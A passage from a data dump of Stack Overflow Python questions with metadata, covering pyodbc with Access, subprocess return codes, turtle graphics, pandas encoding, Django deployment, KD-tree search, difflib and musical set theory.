db_test1 = r'''..\Test #1.accdb'''
db_test2 = r'''..\Test #2.accdb'''
db_test3 = r'''..\Test #3.accdb'''
db_test4 = r'''..\Test #4.accdb'''

db_test_objects = [db_test1, db_test2, db_test3, db_test4]

odbc_conn_str = ""Driver=%s;DBQ=%s;"" % (odbc_driver, db_file)
print (odbc_conn_str)

conn = pyodbc.connect(odbc_conn_str)
odbc_cursor = conn.cursor()

NewQuery = ""CREATE TABLE TestTable(symbol varchar(15), leverage double)""

odbc_cursor.execute(NewQuery)
conn.commit()
conn.close()
</code></pre>

<p>SO, How to create and save MS Access Query <strong>like objects</strong> from python?
I tried to search info in Google, but the answers were related with <strong>Run SQL code</strong>.</p>

<p>On VBA this code looks like:</p>

<pre><code>Public Sub CreateQueryDefX()

   Dim base(1 To 4) As String
   base(1) = ""..\Test #1.accdb""
   base(2) = ""..\Test #2.accdb""
   base(3) = ""..\Test #3.accdb""
   base(4) = ""..\Test #4.accdb""

   For i = LBound(base) To UBound(base)
    CurrentBase = base(i)
    Set dbo = OpenDatabase(CurrentBase)
        With dbo
        Set QueryNew = .CreateQueryDef(""TestQuery"", _
         ""SELECT * FROM TestTable"")
         RefreshDatabaseWindow
        .Close
        End With
   Next i

RefreshDatabaseWindow

End Sub
</code></pre>

<p>Sorry for my English, it's not my native :)</p>

<p>By the way, I know how to solve this by VBA, but I'm interested in solve this by python.</p>

<p>Thank you.</p>
"
40097144,1770210.0,2016-10-17 23:20:09+00:00,3,Return code of a bash script being called from a Subprocess,"<p>I am writing a script that imports a bunch of data to a couchdb database, the issue is each db takes around 15 minutes, so I do not watch the whole thing as I have on average 20 db to import.</p>

<p>The script loops through an array of items, and then calls subprocess on each in order run the import before moving on to the next.</p>

<p>What I have tried to do is catch any db's that do not load correctly, by way of failed script.
I am trying to catch this when the return code is not 0, the issue is I can only get the return code of the subprocess calling the docker command, not if the script executes correctly. </p>

<pre><code>#!/usr/bin/python
import sys
import subprocess

cities = [""x"",""y"", ""z""];

uncompletedcities = []
for x in cities:
    dockerscript = ""docker exec -it docker_1 ./node_modules/.bin/babel-node --debug --presets es2015 app/exportToCouch %s %s"" % (x,x)
    p = subprocess.Popen(dockerscript, shell=True, stderr=subprocess.PIPE)
    error = p.communicate()
    if p.returncode != 0:
            uncompletedcities.append(x)

    while p.poll() == None:
        print p.stderr.read()

print (uncompletedcities)
</code></pre>

<p>so the issue is, I recieve the return code of </p>

<pre><code>p = subprocess.Popen(dockerscript, shell=True, stderr=subprocess.PIPE)
</code></pre>

<p>not the return code of the script being called here</p>

<pre><code>dockerscript = ""docker exec -it docker_1 ./node_modules/.bin/babel-node --debug --presets es2015 app/exportToCouch %s %s"" % (x,x)
</code></pre>

<p>so in essence, I want to go one deeper into the return code, and get the return code of the docker command that subprocess is calling, no the return code of subprocess. </p>

<p>So just to get the return code of this:</p>

<pre><code>docker exec -it docker_1 ./node_modules/.bin/babel-node --debug --presets es2015 app/exportToCouch 
</code></pre>
"
40064750,3993641.0,2016-10-15 22:09:45+00:00,3,"Python abundant, deficient, or perfect number","<pre><code>def classify(numb):
    i=1
    j=1
    sum=0
    for i in range(numb):
        for j in range(numb):
            if (i*j==numb):
                sum=sum+i
                sum=sum+j
            if sum&gt;numb:
                print(""The value"",numb,""is an abundant number."")
            elif sum&lt;numb:
                print(""The value"",numb,""is a deficient number."")
            else:
                print(""The value"",numb,""is a perfect number."")
            break
    return ""perfect""
</code></pre>

<p>The code takes a number(numb) and classifies it as an abundant, deficient or perfect number. My output is screwy and only works for certain numbers. I assume it's indentation or the break that I am using incorrectly. Help would be greatly appreciated. </p>
"
39963364,5818886.0,2016-10-10 17:09:00+00:00,3,need user to be able to input up to three letters at a time for python turtle to draw,"<p>I have the code all worked out to be able to input one letter at a time but for some reason cant figure out how to make it so the user can input up to three letters for turtle to draw. this is my code so far. any help would be appreciated, thank you in advance</p>

<pre><code>import turtle
velcro = turtle.Turtle()
wn = turtle.Screen()
wn.bgcolor('pink')
velcro.color(""purple"", ""blue"")
velcro.color()
('purple', 'blue')
velcro.pensize(""12"")

def color_purple():
  velcro.color ('purple')
def color_blue():
  velcro.color('blue')
def color_black():
  velcro.color ('black')


velcroColor = turtle.textinput(""pick a color"", ""please chose from the colors purple, blue or black, to draw in"")
if (velcroColor == 'purple'):
  color_purple()
elif (velcroColor == 'blue'):
  color_blue()
elif (velcroColor == 'black'):
  color_black()


def letter_A():
  velcro.left(90)
  velcro.forward(150)
  velcro.right(90)
  velcro.forward(150)
  velcro.right(90)
  velcro.forward(150)
  velcro.right(180)
  velcro.forward(75)
  velcro.left(90)                             
  velcro.forward(150)                        

def letter_B():
  velcro.left(90)
  velcro.forward(150)
  velcro.right(90)
  velcro.forward(80)
  velcro.right(90)
  velcro.forward(80)
  velcro.right(90)
  velcro.forward(80)
  velcro.right(180)
  velcro.forward(95)
  velcro.right(90)
  velcro.forward(80)
  velcro.right(90)
  velcro.forward(93)

def letter_C():
  velcro.right(90)
  velcro.forward(150)
  velcro.left(90)
  velcro.forward(150)
  velcro.left(180)
  velcro.forward(150)
  velcro.right(90)
  velcro.forward(200)
  velcro.right(90)
  velcro.forward(150)

def letter_D():
  velcro.left(90)
  velcro.forward(200)
  velcro.right(98)
  velcro.forward(180)
  velcro.right(85)
  velcro.forward(200)
  velcro.right(96)
  velcro.forward(172)

def letter_E():
  velcro.right(90)
  velcro.forward(200)
  velcro.left(90)
  velcro.forward(155)
  velcro.left(180)
  velcro.forward(155)
  velcro.right(90)
  velcro.forward(250)
  velcro.right(90)
  velcro.forward(155)
  velcro.left(180)
  velcro.forward(155)
  velcro.left(90)
  velcro.forward(125)
  velcro.left(90)
  velcro.forward(150)

def letter_F():
  velcro.right(90)
  velcro.forward(200)
  velcro.right(180)
  velcro.forward(250)
  velcro.right(90)
  velcro.forward(150)
  velcro.left(180)
  velcro.forward(150)
  velcro.left(90)
  velcro.forward(95)
  velcro.left(90)
  velcro.forward(125)


def letter_G():
  velcro.left(90)
  velcro.forward(200)
  velcro.right(90)
  velcro.forward(155)
  velcro.right(180)
  velcro.forward(155)
  velcro.left(90)
  velcro.forward(225)
  velcro.left(90)
  velcro.forward(175)
  velcro.left(90)
  velcro.forward(80)
  velcro.left(90)
  velcro.forward(80)


def letter_H():
  velcro.forward(150)
  velcro.right(90)
  velcro.forward(175)
  velcro.right(180)
  velcro.forward(300)
  velcro.left(180)
  velcro.forward(125)
  velcro.right(90)
  velcro.forward(150)
  velcro.right(90)
  velcro.forward(125)
  velcro.right(180)
  velcro.forward(300)


def letter_I():
  velcro.left(90)
  velcro.forward(150)
  velcro.left(90)
  velcro.forward(100)
  velcro.right(180)
  velcro.forward(200)
  velcro.right(180)
  velcro.forward(100)
  velcro.left(90)
  velcro.forward(250)
  velcro.right(90)
  velcro.forward(100)
  velcro.right(180)
  velcro.forward(200)

def letter_J():
  velcro.left(90)
  velcro.forward(150)
  velcro.left(90)
  velcro.forward(100)
  velcro.left(180)
  velcro.forward(200)
  velcro.left(180)
  velcro.forward(100)
  velcro.left(90)
  velcro.forward(250)
  velcro.right(90)
  velcro.forward(100)
  velcro.right(90)
  velcro.forward(95)

def letter_K():
  velcro.left(90)
  velcro.forward(200)
  velcro.left(180)
  velcro.forward(100)
  velcro.left(145)
  velcro.forward(100)
  velcro.left(180)
  velcro.forward(100)
  velcro.left(85)
  velcro.forward(150)

def letter_L():
  velcro.left(90)
  velcro.forward(250)
  velcro.left(180)
  velcro.forward(300)
  velcro.left(90)
  velcro.forward(200)

def letter_M():
  velcro.left(90)
  velcro.forward(250)
  velcro.right(140)
  velcro.forward(200)
  velcro.left(100)
  velcro.forward(200)
  velcro.right(140)
  velcro.forward(250)

def letter_N():
  velcro.left(90)
  velcro.forward(200)
  velcro.right(140)
  velcro.forward(250)
  velcro.left(140)
  velcro.forward(200)

def letter_O():
  velcro.left(180)
  velcro.forward(100)
  velcro.right(90)
  velcro.forward(250)
  velcro.right(90)
  velcro.forward(100)
  velcro.right(90)
  velcro.forward(250)

def letter_P():
  velcro.left(90)
  velcro.forward(250)
  velcro.right(90)
  velcro.forward(95)
  velcro.right(90)
  velcro.forward(95)
  velcro.right(90)
  velcro.forward(95)

def letter_Q():
  velcro.left(90)
  velcro.forward(250)
  velcro.left(90)
  velcro.forward(150)
  velcro.left(90)
  velcro.forward(250)
  velcro.left(90)
  velcro.forward(150)
  velcro.left(140)
  velcro.forward(50)
  velcro.left(180)
  velcro.forward(100)

def letter_R():
  velcro.left(90)
  velcro.forward(250)
  velcro.right(90)
  velcro.forward(100)
  velcro.right(90)
  velcro.forward(115)
  velcro.right(90)
  velcro.forward(100)
  velcro.left(135)
  velcro.forward(180)

def letter_S():
  velcro.right(90)
  velcro.forward(150)
  velcro.right(90)
  velcro.forward(150)
  velcro.left(180)
  velcro.forward(150)
  velcro.left(90)
  velcro.forward(150)
  velcro.left(90)
  velcro.forward(150)
  velcro.right(90)
  velcro.forward(150)
  velcro.right(90)
  velcro.forward(150)

def letter_T():
  velcro.left(90)
  velcro.forward(150)
  velcro.left(90)
  velcro.forward(50)
  velcro.right(180)
  velcro.forward(100)

def letter_U():
  velcro.left(90)
  velcro.forward(200)
  velcro.left(180)
  velcro.forward(200)
  velcro.right(90)
  velcro.forward(150)
  velcro.right(90)
  velcro.forward(200)

def letter_V():
  velcro.left(115)
  velcro.forward(250)
  velcro.left(180)
  velcro.forward(250)
  velcro.left(120)
  velcro.forward(250)

def letter_W():
  velcro.left(270)
  velcro.forward(275)
  velcro.right(140)
  velcro.forward(200)
  velcro.left(100)
  velcro.forward(200)
  velcro.right(140)
  velcro.forward(275)

def letter_X():
  velcro.left(140)
  velcro.forward(300)
  velcro.left(180)
  velcro.forward(150)
  velcro.right(270)
  velcro.forward(150)
  velcro.right(180)
  velcro.forward(300)

def letter_Y():
  velcro.left(140)
  velcro.forward(200)
  velcro.left(180)
  velcro.forward(200)
  velcro.right(275)
  velcro.forward(200)
  velcro.left(180)
  velcro.forward(200)
  velcro.left(45)
  velcro.forward(250)

def letter_Z():
  velcro.forward(225)
  velcro.left(140)
  velcro.forward(300)
  velcro.right(140)
  velcro.forward(225)



velcroLetter = turtle.textinput(""Turtle alphabet"", ""please enter a capital letter from A-Z to draw:"")
if (velcroLetter == 'a' or velcroLetter == 'A'):
   letter_A()
elif (velcroLetter == 'b' or velcroLetter == 'B'):
   letter_B()
elif (velcroLetter == 'c' or velcroLetter == 'C'):
   letter_C()
elif (velcroLetter == 'd' or velcroLetter == 'D'):
   letter_D()
elif (velcroLetter == 'e' or velcroLetter == 'E'):
   letter_E()
elif (velcroLetter == 'f' or velcroLetter == 'F'):
   letter_F()
elif (velcroLetter == 'g' or velcroLetter == 'G'):
   letter_G()
elif (velcroLetter == 'h' or velcroLetter == 'H'):
   letter_H()
elif (velcroLetter == 'i' or velcroLetter == 'I'):
   letter_I()
elif (velcroLetter == 'j' or velcroLetter == 'J'):
   letter_J()
elif (velcroLetter == 'k' or velcroLetter == 'K'):
   letter_K()
elif (velcroLetter == 'l' or velcroLetter == 'L'):
   letter_L()
elif (velcroLetter == 'm' or velcroLetter == 'M'):
   letter_M()
elif (velcroLetter == 'n' or velcroLetter == 'N'):
   letter_N()
elif (velcroLetter == 'o' or velcroLetter == 'O'):
   letter_O()
elif (velcroLetter == 'p' or velcroLetter == 'P'):
   letter_P()
elif (velcroLetter == 'q' or velcroLetter == 'Q'):
   letter_Q()
elif (velcroLetter == 'r' or velcroLetter == 'R'):
   letter_R()
elif (velcroLetter == 's' or velcroLetter == 'S'):
   letter_S()
elif (velcroLetter == 't' or velcroLetter == 'T'):
   letter_T()
elif (velcroLetter == 'u' or velcroLetter == 'U'):
   letter_U()
elif (velcroLetter == 'v' or velcroLetter == 'V'):
   letter_V()
elif (velcroLetter == 'w' or velcroLetter == 'W'):
   letter_W()
elif (velcroLetter == 'x' or velcroLetter == 'X'):
   letter_X()
elif (velcroLetter == 'y' or velcroLetter == 'Y'):
   letter_Y()
elif (velcroLetter == 'z' or velcroLetter == 'Z'):
   letter_Z()


turtle.mainloop()
</code></pre>
"
39641171,463300.0,2016-09-22 13:59:02+00:00,3,How to pass list of function and all its arguments to be executed in another function in python?,"<p>I have a list of functions and its arguments like this:</p>

<pre><code>(func1, *arg1), (func2, *arg2),...
</code></pre>

<p>I want to pass them into another function to execute them like this:</p>

<pre><code>for func, arg* in (list of funcs, args):
   func(arg*)
</code></pre>

<p>How to do it in python? I have tried several but it doesn't like unpacking and *arg at the same time.</p>
"
39645125,4044400.0,2016-09-22 17:16:11+00:00,3,LabelEncoder().fit_transform vs. pd.get_dummies for categorical coding,"<p>It was recently brought to my attention that if you have a dataframe <code>df</code> like this:</p>

<pre><code>   A      B   C
0  0   Boat  45
1  1    NaN  12
2  2    Cat   6
3  3  Moose  21
4  4   Boat  43
</code></pre>

<p>You can encode the categorical data automatically with <code>pd.get_dummies</code>:</p>

<pre><code>df1 = pd.get_dummies(df)
</code></pre>

<p>Which yields this:</p>

<pre><code>   A   C  B_Boat  B_Cat  B_Moose
0  0  45     1.0    0.0      0.0
1  1  12     0.0    0.0      0.0
2  2   6     0.0    1.0      0.0
3  3  21     0.0    0.0      1.0
4  4  43     1.0    0.0      0.0
</code></pre>

<p>I typically use <code>LabelEncoder().fit_transform</code> for this sort of task before putting it in <code>pd.get_dummies</code>, but if I can skip a few steps that'd be desirable.  </p>

<p>Am I losing anything by simply using <code>pd.get_dummies</code> on my entire dataframe to encode it?  </p>
"
39590741,6852619.0,2016-09-20 09:41:33+00:00,3,fatal error: 'QTKit/QTKit.h' file not found when I build OpenCV on mac,"<p>I have followed this <a href=""http://www.pyimagesearch.com/2015/06/15/install-opencv-3-0-and-python-2-7-on-osx/"" rel=""nofollow"">http://www.pyimagesearch.com/2015/06/15/install-opencv-3-0-and-python-2-7-on-osx/</a> to install OpenCV on my mac.
When I do this step :
    $ make -j4
a problem happened:</p>

<pre><code>fatal error: 
      'QTKit/QTKit.h' file not found
#import &lt;QTKit/QTKit.h&gt;
        ^ 1 error generated. make[2]: *** [modules/videoio/CMakeFiles/opencv_videoio.dir/src/cap_qtkit.mm.o]
Error 1 make[1]: ***
[modules/videoio/CMakeFiles/opencv_videoio.dir/all] Error 2 make: ***
[all] Error 2
</code></pre>
"
39836404,4094231.0,2016-10-03 16:40:47+00:00,3,Wait for a Request to complete - Python Scrapy,"<p>I have a Scrapy Spider which scrapes a website and that website requires to refresh a token to be able to access them.</p>

<pre><code>def get_ad(self, response):
    temp_dict = AppextItem()
    try:
        Selector(response).xpath('//div[@class=""messagebox""]').extract()[0]
        print(""Captcha found when scraping ID ""+ response.meta['id'] + "" LINK: ""+response.meta['link'])
        self.p_token = ''

        return Request(url = url_, callback=self.get_p_token, method = ""GET"",priority=1, meta = response.meta)

    except Exception:
        print(""Captcha was not found"")
</code></pre>

<p>I have a <code>get_p_token</code> method that refreshes token and assigns to <code>self.p_token</code> </p>

<p><code>get_p_token</code> is called when Captcha is found, but problem is, other Requests keep executing.</p>

<p>I want that if Captcha is found, do not make next request until execution of <code>get_p_token</code> is finished.</p>

<p>I have <code>priority=1</code> but that does not help.</p>

<p><a href=""http://pastebin.com/X6Q4ZFp2"" rel=""nofollow"">HERE is full code of Spider</a></p>

<p>P.S:</p>

<p>Actually that token is passed to each URL so that is why I want to wait until a new token is found and then scrape the rest of URLs.</p>
"
39689534,6878511.0,2016-09-25 17:05:52+00:00,3,Django 500 Internal Server Error with Passenger on Dreamhost,"<p>I'm trying to migrate my fully working Django 1.9.6 project with Python 2.7.3 to Dreamhost. I'm not sure if my current file structure is correct, as well as my passenger_wsgi.py and project.fcgi files.</p>

<p>When I try to access the website I get a 500 Internal Server Error message.</p>

<p><strong>Here's my directory structure</strong></p>

<pre><code>home
    user
        website.com
            .htaccess
            env
                bin
                include
                lib
                local
            public
                assets
            passenger_wsgi.py
            manage.py
            project.fcgi
            django-project
                settings.py
                urls.py
                wsgi.py
            django-app
</code></pre>

<p><strong>Here's my passenger_wsgi.py</strong></p>

<pre><code>import sys, os
cwd = os.getcwd()

sys.path.append(cwd)
sys.path.append(cwd + '/django-project')

if sys.version &lt; ""2.7.3"": os.execl(""/home/user/website.com/env/bin/python"",
""python2.7.3"", *sys.argv)

sys.path.insert(0,'/home/user/website.com/env/bin')
sys.path.insert(0,'/home/user/website.com/env/lib/python2.7/site-packages/django')
sys.path.insert(0,'/home/user/website.com/env/lib/python2.7/site-packages')


os.environ['DJANGO_SETTINGS_MODULE'] = ""django-project.settings""

from django.core.wsgi import get_wsgi_application
application = get_wsgi_application()
</code></pre>

<p><strong>Here's my django-project.fcgi</strong></p>

<pre><code>import sys, os

sys.path.insert(0, ""/home/user/website.com/env/bin/python"")

os.chdir(""/home/user/website.com/django-project"")

os.environ['DJANGO_SETTINGS_MODULE'] = ""django-project.settings""

from django.core.servers.fastcgi import runfastcgi
runfastcgi(method=""threaded"", daemonize=""false"")
</code></pre>

<p>Any ideas where I'm going wrong? This is my first time launching a website like this so I may be making a fundamental directory structure mistake.</p>

<p>Let me know if I should provide any other files or information.</p>
"
39660968,5847311.0,2016-09-23 12:38:06+00:00,3,How can I speed up nearest neighbor search with python?,"<p>I have a code, which calculates the nearest voxel (which is unassigned) to a voxel ( which is assigned). That is i have an array of voxels, few voxels already have a scalar (1,2,3,4....etc) values assigned, and few voxels are empty (lets say a value of '0'). This code below finds the nearest assigned voxel to an unassigned voxel and assigns that voxel the same scalar. So, a voxel with a scalar '0' will be assigned a value (1 or 2 or 3,...) based on the nearest voxel. This code below works, but it takes too much time.
Is there an alternative to this ? or if you have any feedback on how to improve it further?</p>

<p>"""""" #self.voxels is a 3D numpy array"""""" </p>

<pre><code>def fill_empty_voxel1(self,argx, argy, argz):
"""""" where # argx, argy, argz are the voxel location where the voxel is zero""""""
    argx1, argy1, argz1 = np.where(self.voxels!=0)   # find the non zero voxels
    a = np.column_stack((argx1, argy1, argz1)) 
    b = np.column_stack((argx, argy, argz))
    tree = cKDTree(a, leafsize=a.shape[0]+1)
    distances, ndx = tree.query(b, k=1, distance_upper_bound= self.mean) # self.mean is a mean radius search value
    argx2, argy2, argz2 = a[ndx][:][:,0],a[ndx][:][:,1],a[ndx][:][:,2]
    self.voxels[argx,argy,argz] = self.voxels[argx2,argy2,argz2] # update the voxel array
</code></pre>

<h1>Example</h1>

<p>"""""" Here is a small example with small dataset:""""""</p>

<pre><code>import numpy as np
from scipy.spatial import cKDTree
import timeit

voxels = np.zeros((10,10,5), dtype=np.uint8)
voxels[1:2,:,:] = 5.
voxels[5:6,:,:] = 2.
voxels[:,3:4,:] = 1.
voxels[:,8:9,:] = 4.
argx, argy, argz = np.where(voxels==0)

tic=timeit.default_timer()
argx1, argy1, argz1 = np.where(voxels!=0)   # non zero voxels
a = np.column_stack((argx1, argy1, argz1)) 
b = np.column_stack((argx, argy, argz))
tree = cKDTree(a, leafsize=a.shape[0]+1)
distances, ndx = tree.query(b, k=1, distance_upper_bound= 5.)
argx2, argy2, argz2 = a[ndx][:][:,0],a[ndx][:][:,1],a[ndx][:][:,2]
voxels[argx,argy,argz] = voxels[argx2,argy2,argz2]
toc=timeit.default_timer()
timetaken = toc - tic #elapsed time in seconds
print '\nTime to fill empty voxels', timetaken
</code></pre>

<h1>for visualization:</h1>

<pre><code>from mayavi import mlab
data = voxels.astype('float')
scalar_field = mlab.pipeline.scalar_field(data)
iso_surf = mlab.pipeline.iso_surface(scalar_field)
surf = mlab.pipeline.surface(scalar_field)  
vol = mlab.pipeline.volume(scalar_field,vmin=0,vmax=data.max())  
mlab.outline()    
mlab.show()    
</code></pre>

<p>Now, if I have the dimension of the voxels array as something like (500,500,500), then the time it takes to compute the nearest search is no longer efficient. How can I overcome this? Could parallel computation reduce the time (I have no idea whether I can parallelize the code, if you do, please let me know)?</p>

<h1>A potential fix:</h1>

<p>I could substantially improve the computation time by adding the n_jobs = -1 parameter in the cKDTree query.</p>

<pre><code>distances, ndx = tree.query(b, k=1, distance_upper_bound= 5., n_jobs=-1)
</code></pre>

<p>I was able to compute the distances in less than a hour for an array of (400,100,100) on a 13 core CPU. I tried with 1 processor and it takes around 18 hours to complete the same array.
Thanks to @gsamaras for the answer!</p>
"
39904506,283296.0,2016-10-06 19:48:15+00:00,3,"Efficient, large-scale competition scoring in Python","<p>Consider a large dataframe of scores <code>S</code> containing entries like the following. Each row represents a contest between a subset of the participants <code>A</code>, <code>B</code>, <code>C</code> and <code>D</code>. </p>

<pre><code> A     B    C   D
0.1  0.3  0.8    1
  1  0.2  NaN  NaN
0.7  NaN    2  0.5
NaN   4   0.6  0.8
</code></pre>

<p>The way to read the matrix above is: looking at the first row, the participant <code>A</code> scored <code>0.1</code> in that round, <code>B</code> scored <code>0.3</code>, and so forth.</p>

<p>I need to build a triangular matrix <code>C</code> where <code>C[X,Y]</code> stores how much better participant <code>X</code> was than participant <code>Y</code>. More specifically, <code>C[X,Y]</code> would hold the <strong>mean</strong> % difference in score between <code>X</code> and <code>Y</code>. </p>

<p>From the example above:</p>

<pre><code>C[A,B] = 100 * ((0.1 - 0.3)/0.3 + (1 - 0.2)/0.2) = 33%
</code></pre>

<p>My matrix <code>S</code> is huge, so I am hoping to take advantage of JIT (Numba?) or built-in methods in <code>numpy</code> or <code>pandas</code>. I certainly want to avoid having a nested loop, since  <code>S</code> has millions of rows.</p>

<p>Does an efficient algorithm for the above have a name?</p>
"
39837416,1534017.0,2016-10-03 17:44:18+00:00,3,How to return False when using issubset and an empty set,"<p>When I have two sets e.g.</p>

<pre><code>s1 = set()    
s2 = set(['somestring'])
</code></pre>

<p>and I do </p>

<pre><code>print s1.issubset(s2)
</code></pre>

<p>it returns <code>True</code>; so apparently, an empty set is always a subset of another set.</p>

<p>For my analysis, it should actually return <code>False</code> and I am wondering about the best way to do this. I can write a function like this:</p>

<pre><code>def check_set(s1, s2):
    if s1 and s1.issubset(s2):
        return True
    return False
</code></pre>

<p>which then indeed returns <code>False</code> for the example above. Is there any better way of doing this?</p>
"
39962499,607407.0,2016-10-10 16:15:53+00:00,3,How to understand/use the Python difflib output?,"<p>I am trying to make comprehensive diff that compares command line output of two programs. I used <code>difflib</code> and came up with this code:</p>

<pre><code>from difflib import Differ
from pprint import pprint
import sys

def readable_whitespace(line):
    return line.replace(""\n"", ""\\n"")

# Two strings are expected as input
def print_diff(text1, text2):
    d = Differ()
    text1 = text1.splitlines(True)
    text2 = text2.splitlines(True)

    text1 = [readable_whitespace(line) for line in text1]
    text1 = [readable_whitespace(line) for line in text2]

    result = list(d.compare(text1, text2))
    sys.stdout.writelines(result)
    sys.stdout.write(""\n"")
</code></pre>

<p>Some requirements I have:</p>

<ul>
<li>(obvious) It should be clear what is from which output when there is a difference</li>
<li>New lines are replaced with <code>\n</code> because they matter in my case and must be clearly visible when causing conflict</li>
</ul>

<p>I made a simple test for my diff function:</p>

<pre><code>A = ""AAABAAA\n""
A += ""BBB\n""
B = ""AAAAAAA\n""
B += ""\n""
B += ""BBB""
print_diff(A,B)
</code></pre>

<p>For your convenience, here is test merged with the function so that you can execute it as file: <a href=""http://pastebin.com/BvQw9naa"" rel=""nofollow"">http://pastebin.com/BvQw9naa</a></p>

<p>I have no idea what is this output trying to say to me:</p>

<pre><code>- AAAAAAA\n?        ^^
+ AAAAAAA
?        ^
- \n+
  BBB
</code></pre>

<p>Notice those two <code>^</code> symbols on first line? What are they pointing to...? Also, I intentionally put trailing new line into one test string. I don't think the diff noticed that.</p>

<p>How to make the output comprehensive <strong>or</strong> learn to understand it?</p>
"
39910050,1487336.0,2016-10-07 05:28:28+00:00,3,How to view the source code of numpy.random.exponential?,"<p>I want to see if <code>numpy.random.exponential</code> was implemented using F^{-1} (U) method, where F is the c.d.f of exponential distribution and U is uniform distribution. </p>

<p>I tried <code>numpy.source(random.exponential)</code>, but returned '<em>Not available for this object'</em>. Does it mean this function is not written in Python?</p>

<p>I also tried <code>inspect.getsource(random.exponential)</code>, but returned an error saying it's not module, function, etc.</p>
"
39838419,6916947.0,2016-10-03 18:48:40+00:00,3,How to do calculations in lists with *args in Python 3.5.1,"<p>I'm not even sure how to ask this question; I've been doing programming for about a month and the progress I've made on this program is still a little bit above my head, so I'm sorry if the question is a little incomprehensible. I'm taking a programming class, but as far as I know, this program is just for my own functionality and enjoyment for music.</p>

<p>I'm trying to write a function that takes musical notes, represented by integers, and spits out a specific arrangement and transformation of those numbers. Specifically I'm trying to convert them into something from musical set theory called ""prime form"".</p>

<p>I wrote a function that successfully does this for a set of three pitches, but I wanted to expand it so that I could have any number of arguments for the function.</p>

<p>Hereâs the code for the first function</p>

<pre><code>def prime_form (pitch1, pitch2, pitch3, tones_in_octave = 12):
    """"""
    (int, int, int, int) -&gt; (str)

    finds the prime form of any 3 note pitch set in any equal temperament,
    one octave span of frequency classes (default is 12 tones).

    &gt;&gt;&gt; prime_form (9, 1, 5)
    (0 4 8)
    this is the prime form!
    &gt;&gt;&gt; prime_form (11, 1, 0)
    (0 1 2)
    this is the prime form!
    &gt;&gt;&gt; prime_form (1, 3, 4)
    (0 1 3)
    this is the prime form!
    """"""
    pitches = [pitch1 %tones_in_octave, pitch2 %tones_in_octave, pitch3 %tones_in_octave]
    spitches = sorted(pitches)
    intervals = [(spitches[1] - spitches[0]) %tones_in_octave, (spitches[2] - spitches[1]) %tones_in_octave, (spitches [0] - spitches[2]) %tones_in_octave]
    sintervals = sorted(intervals) 
    prime_form = [0, sintervals[0], sintervals[0]+sintervals[1]]
    print('({} {} {})\nthis is the prime form!'.format(prime_form[0], prime_form[1], prime_form[2]))        
</code></pre>

<p>I learned a bit about *args, and this is what I ended up with after some help from programmers much smarter than me. </p>

<pre><code>def prime_form (*pitches, tones_in_octave = 12):
    tones_in_octave=int(tones_in_octave)
    spitches = list(set(sorted([pitch %tones_in_octave for pitch in list(pitches)])))
    print(spitches)
</code></pre>

<p>Paralleling the last program, this does what I need it to do so far up to the part where I start defining âintervalsâ, but I donât know how to go about doing so. I guess I could write a lot of if statements, but theoretically if I wanted to make it functional for <code>tones_in_octave = 12</code>, then I would have to write a lot of <code>if</code> and <code>elif</code> statements, and even then if I wanted to go past that (there is even an established system of music which utilize <code>43</code> tones in an octave, though that specific system wouldn't benefit from this function), I would have to write a bunch of them manually, and even then my function would stop working at the point I decide to stop.</p>

<p>In this case, what I would want to write out literally in the code would be </p>

<pre><code>sintervals = sorted([(spitches[1] - spitches[0]) %tones_in_octave, (spitches[2] - spitches[1]) %tones_in_octave, â¦, (spitches[n-1] - spitches[n-2]) %tones_in_octave, (spitches[0] - spitches[-1]) %tones_in_octave])
</code></pre>

<p>Where n is the number of items in the list <code>spitches</code> (which is different from the items in *pitches, since the way <code>spitches</code> is defined removes redundant values)</p>

<p>Question 1. How do I define a variable as this list in python?</p>

<p>After that, adding intervals like this yields prime form</p>

<pre><code>prime_from = [0, sintervals[0], sintervals[0] + sintervals[1], sintervals[0] + sintervals[1] + sintervals [2], ..., sintervals[0] + sintervals[1] + ... + sintervals[n-2]]
</code></pre>

<p>Where n is the number of items in <code>sintervals</code> (and also the number of items in this list)</p>

<p>Question 2. How do I add numbers like this depending on how many items are in my list from Question 1?</p>

<p>Edit: </p>

<p>Here is an explanation of what is ultimately trying to be accomplished, sorry if it isn't the clearest (it might even be flat out wrong aahahaha lets hope not).</p>

<p>---BACKGROUND: Pitch and Octaves---</p>

<p>In the most popularly used system of music, specific frequencies of air vibrations are called a ""pitches""; frequency of the pitch is calculated by</p>

<p>(reference)*2^(distance from reference in pitches / pitches in an octave)</p>

<p>An ""octave"" is a (2^x):1 frequency relationship where x is an integer and x = the ""amount of octaves""; this relationship is important, because us humans perceive frequencies of air vibrations related by octaves/this ratio to be more or less the same. The frequency most commonly used for the reference pitch in this system of music is ""A 440"" meaning ""A4"" is the frequency 440Hz. The 4 in ""A4"" is a register number for which ""octave register"" the note is in. The octave registers are divided up on the pitch C, so A4 is the A ""above"" or ""with a higher frequency than"" C4 (which has a frequency of (440)^-9/12 = ~261.6Hz) Ex. A0 = 27.5Hz, A1 = 55Hz, A2 = 110Hz, etc. (You can tell that the alphabetical notation system we still use was conceived before the measurement of the frequency of air vibrations)</p>

<p>---Background: Music Theory---</p>

<p>In Music Theory, Set Theory is one of the well established tools used to approach Music Theory. Musical Set Theory abstractifies pitch as integers. It also usually disregards octave registers, treating A4 completely equal to A2, A3, A6 etc. In the aforementioned most popularly used system of music, there are 12 tones in an octave, so the way to reference pitches in Set Theory changes from (C, C#, D, D#, E, F, F#, G, G#, A, A#, B) to (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11) respectively; to make sure that everyone is on the same page, there is a name for when octave registers are treated as irrelevant information for a pitch called ""pitch class"". With pitch classes, all math is done in mod 12, like a clock face, since there are 12 tones in an octave.</p>

<p>Also in Set Theory, there is a useful way to list a set of pitch classes (""pitch class set"") called ""prime form"". Prime forms, also referred to as set classes are regarded as the most concise and abstract way to represent pitch class sets.</p>

<p>---What I'm Trying to Accomplish---</p>

<p>I want to write code that eats pitch class sets and spits out set classes/prime form. As a note, prime form must begin on 0, if it meets the other requirements (leftmost-compact considering the inversion of the set) and does not begin on 0, then will be transposed to start on 0 Ex. [1,2,4] is a leftmost-compact arrangement considering its inversion [1,3,4], but does not start on zero, so the set is transposed by (-1) to (0 1 3) which is its prime from. A human being trying to figure out prime form usually takes a few steps to arrive at the answer:</p>

<ol>
<li><p>Remove redundant pitches classes - if you get pitches like (1, 13, 0, 2, 0), remove 13 because it is redundant with 1 (13%12 = 1) and remove the second 0.</p></li>
